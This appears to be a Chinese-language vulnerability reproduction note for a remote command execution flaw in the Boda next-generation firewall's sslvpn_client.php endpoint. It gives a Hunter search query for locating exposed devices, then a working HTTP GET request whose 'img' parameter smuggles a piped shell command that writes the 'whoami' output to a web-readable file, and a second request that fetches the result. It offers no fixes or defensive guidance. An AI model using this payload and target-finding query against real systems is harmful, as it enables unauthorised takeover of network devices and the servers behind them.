# 博达下一代防火墙sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
博达下一代防火墙sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 博达下一代防火墙

# 三、资产测绘
+ hunter`web.title=="博达下一代防火墙"`||`web.title=="博达上网行为管理"`
+ 特征

![1701763514488-337ef992-b1b8-4613-be19-61a335aefe7c.png](./img/KFOD6d47fNNCV5ke/1701763514488-337ef992-b1b8-4613-be19-61a335aefe7c-234395.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e.png](./img/KFOD6d47fNNCV5ke/1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e-955380.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762342384-224cbced-19ed-428d-b26d-9957865251d2.png](./img/KFOD6d47fNNCV5ke/1701762342384-224cbced-19ed-428d-b26d-9957865251d2-247511.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hypcbmrskmt1pm4v>